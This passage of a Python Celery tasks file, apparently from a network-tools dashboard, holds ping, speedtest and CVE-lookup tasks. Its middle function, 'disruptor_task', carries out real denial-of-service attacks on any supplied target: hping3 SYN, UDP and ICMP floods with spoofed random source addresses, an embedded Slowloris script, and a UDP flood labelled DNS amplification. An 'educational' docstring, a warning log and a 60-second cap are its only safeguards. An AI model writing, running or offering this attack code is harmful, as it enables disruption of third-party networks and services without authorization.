        except Exception as e:
            await publish_log(scan_id, "ERROR", "enricher", f"Enrichment error for {ip}: {str(e)}")
            return {"error": str(e)}


@celery_app.task
def ping_task(target: str, count: int = 4) -> Dict:
    """Execute ping task"""
    try:
        result = subprocess.run(
            ["ping", "-c", str(count), target],
            capture_output=True,
            text=True,
            timeout=30,
        )
        
        # Parse ping output
        output = result.stdout
        
        # Extract statistics
        packets_sent = count
        packets_received = 0
        packet_loss = 100.0
        min_rtt = max_rtt = avg_rtt = stddev_rtt = None
        
        # Parse received packets
        received_match = re.search(r"(\d+) received", output)
        if received_match:
            packets_received = int(received_match.group(1))
            packet_loss = ((packets_sent - packets_received) / packets_sent) * 100
        
        # Parse RTT statistics
        rtt_match = re.search(r"min/avg/max/(?:mdev|stddev) = ([\d.]+)/([\d.]+)/([\d.]+)/([\d.]+)", output)
        if rtt_match:
            min_rtt = float(rtt_match.group(1))
            avg_rtt = float(rtt_match.group(2))
            max_rtt = float(rtt_match.group(3))
            stddev_rtt = float(rtt_match.group(4))
        
        return {
            "target": target,
            "packets_sent": packets_sent,
            "packets_received": packets_received,
            "packet_loss_percent": packet_loss,
            "min_rtt": min_rtt,
            "avg_rtt": avg_rtt,
            "max_rtt": max_rtt,
            "stddev_rtt": stddev_rtt,
            "output": output,  # Include raw output for display
        }
    
    except Exception as e:
        return {"error": str(e)}


@celery_app.task
def speedtest_task() -> Dict:
    """Execute speedtest task"""
    try:
        # Use speedtest-cli if available
        result = subprocess.run(
            ["speedtest-cli", "--json"],
            capture_output=True,
            text=True,
            timeout=60,
        )
        
        if result.returncode == 0:
            data = json.loads(result.stdout)
            server_info = data.get("server", {})
            client_info = data.get("client", {})
            server_name = server_info.get("sponsor") or server_info.get("name") or "Unknown"
            server_location_parts = [
                server_info.get("name"),
                server_info.get("country"),
            ]
            server_location = ", ".join([part for part in server_location_parts if part]) or None
            result_url = data.get("share") or data.get("result")
            return {
                "download_mbps": data["download"] / 1_000_000,
                "upload_mbps": data["upload"] / 1_000_000,
                "ping_ms": data["ping"],
                "server": server_name,
                "server_location": server_location,
                "isp": client_info.get("isp"),
                "result_url": result_url,
                "timestamp": datetime.utcnow().isoformat(),
            }
        else:
            return {"error": "Speedtest failed"}
    
    except FileNotFoundError:
        return {"error": "speedtest-cli not installed"}
    except Exception as e:
        return {"error": str(e)}


@celery_app.task
def disruptor_task(target: str, method: str, duration: int) -> Dict:
    """Execute network disruption task (educational/testing purposes only)"""
    logger.warning(
        "disruptor_task_called",
        target=target,
        method=method,
        duration=duration,
        message="DISRUPTOR TASK INITIATED - ENSURE PROPER AUTHORIZATION"
    )
    
    # Cap duration for safety
    duration = min(duration, 60)
    
    try:
        result = None
        output = ""
        
        if method == "syn_flood":
            # SYN FLOOD using hping3 - REAL ATTACK
            logger.info(f"Executing SYN FLOOD on {target} for {duration}s")
            result = subprocess.run(
                ["hping3", "-S", "-p", "80", "--flood", "--rand-source", target],
                capture_output=True,
                text=True,
                timeout=duration,
            )
            output = result.stdout + result.stderr
                
        elif method == "udp_flood":
            # UDP FLOOD using hping3 - REAL ATTACK
            logger.info(f"Executing UDP FLOOD on {target} for {duration}s")
            result = subprocess.run(
                ["hping3", "--udp", "-p", "53", "--flood", "--rand-source", target],
                capture_output=True,
                text=True,
                timeout=duration,
            )
            output = result.stdout + result.stderr
                
        elif method == "icmp_flood":
            # ICMP FLOOD using hping3 - REAL ATTACK
            logger.info(f"Executing ICMP FLOOD on {target} for {duration}s")
            result = subprocess.run(
                ["hping3", "--icmp", "--flood", "--rand-source", target],
                capture_output=True,
                text=True,
                timeout=duration,
            )
            output = result.stdout + result.stderr
                
        elif method == "slowloris":
            # Slowloris Attack using Python implementation
            logger.info(f"Executing SLOWLORIS on {target} for {duration}s")
            try:
                result = subprocess.run(
                    ["python3", "-c", f"""
import socket
import time
import random
import sys

target = '{target}'
port = 80
duration = {duration}
sockets = []
user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
    'Mozilla/5.0 (X11; Linux x86_64)',
]

print(f'Starting Slowloris attack on {{target}}:{{port}} for {{duration}}s')
start = time.time()

while time.time() - start < duration:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((target, port))
        s.send(f'GET /?{{random.randint(0, 2000)}} HTTP/1.1\\r\\n'.encode())
        s.send(f'User-Agent: {{random.choice(user_agents)}}\\r\\n'.encode())
        s.send(f'Accept-language: en-US,en,q=0.5\\r\\n'.encode())
        sockets.append(s)
        print(f'Socket {{len(sockets)}} created')
    except:
        pass
    
    # Keep connections alive
    for sock in sockets:
        try:
            sock.send(f'X-a: {{random.randint(1, 5000)}}\\r\\n'.encode())
        except:
            sockets.remove(sock)
    
    time.sleep(0.1)

print(f'Attack completed. Max sockets: {{len(sockets)}}')
"""],
                    capture_output=True,
                    text=True,
                    timeout=duration + 5,
                )
                output = result.stdout + result.stderr
            except Exception as e:
                output = f"Slowloris execution error: {str(e)}"
                
        elif method == "dns_amplification":
            # DNS Amplification using hping3 - REAL ATTACK
            logger.info(f"Executing DNS AMPLIFICATION on {target} for {duration}s")
            result = subprocess.run(
                ["hping3", "--udp", "-p", "53", "--flood", "--rand-source", "-d", "512", target],
                capture_output=True,
                text=True,
                timeout=duration,
            )
            output = result.stdout + result.stderr
        else:
            return {"status": "error", "message": f"Unknown method: {method}"}
        
        logger.info(f"Disruptor task completed for {target}")
        
        return {
            "status": "completed",
            "target": target,
            "method": method,
            "duration": duration,
            "message": f"Attack executed on {target} using {method} for {duration}s",
            "output": output[:1000] if output else "Attack completed successfully",
        }
            
    except subprocess.TimeoutExpired as e:
        # This is expected - the attack ran for the full duration
        output = e.stdout.decode() if e.stdout else ""
        output += e.stderr.decode() if e.stderr else ""
        logger.info(f"Disruptor task completed (timeout as expected) for {target}")
        return {
            "status": "completed",
            "target": target,
            "method": method,
            "duration": duration,
            "message": f"Attack executed on {target} using {method} for full duration of {duration}s",
            "output": output[:1000] if output else "Attack ran for full duration",
        }
    except FileNotFoundError as e:
        logger.error(f"Tool not found: {str(e)}")
        return {"status": "error", "message": f"Required tool not installed: {str(e)}"}
    except Exception as e:
        logger.error("disruptor_task_failed", target=target, method=method, error=str(e))
        return {"status": "error", "message": str(e)}
@celery_app.task
def cve_lookup(service: str, version: str) -> List[Dict]:
    """Standalone CVE lookup task"""
    return asyncio.run(_cve_lookup_async(service, version))


async def _cve_lookup_async(service: str, version: str) -> List[Dict]:
    """Async CVE lookup implementation"""
    search_term = f"{service} {version}".strip()
    
    # Check cache
    r = await get_redis()
    cache_key = f"cve:{search_term}"
    cached = await r.get(cache_key)
    
    if cached:
        await r.aclose()
        return json.loads(cached)
    
    try:
        import nvdlib
        cves = nvdlib.searchCVE(keywordSearch=search_term, limit=20)
        results = []
        
        for cve in cves:
            severity = "LOW"
            cvss_score = None
            
            if hasattr(cve, "v31score") and cve.v31score:
                cvss_score = cve.v31score
            elif hasattr(cve, "v2score") and cve.v2score:
                cvss_score = cve.v2score
            
            if cvss_score:
                if cvss_score >= 9.0:
                    severity = "CRITICAL"
                elif cvss_score >= 7.0:
                    severity = "HIGH"
                elif cvss_score >= 4.0:
                    severity = "MEDIUM"
            
            results.append({
                "cve": cve.id,
                "severity": severity,
                "cvss_score": cvss_score,
                "summary": cve.descriptions[0].value if cve.descriptions else "",
                "references": [ref.url for ref in cve.references] if cve.references else [],
            })
        
        # Cache results
        await r.setex(cache_key, settings.cve_cache_ttl, json.dumps(results))
        await r.aclose()
        return results
    
    except Exception as e:
        await r.aclose()
        logger.error("cve_lookup_failed", service=service, version=version, error=str(e))
        return []
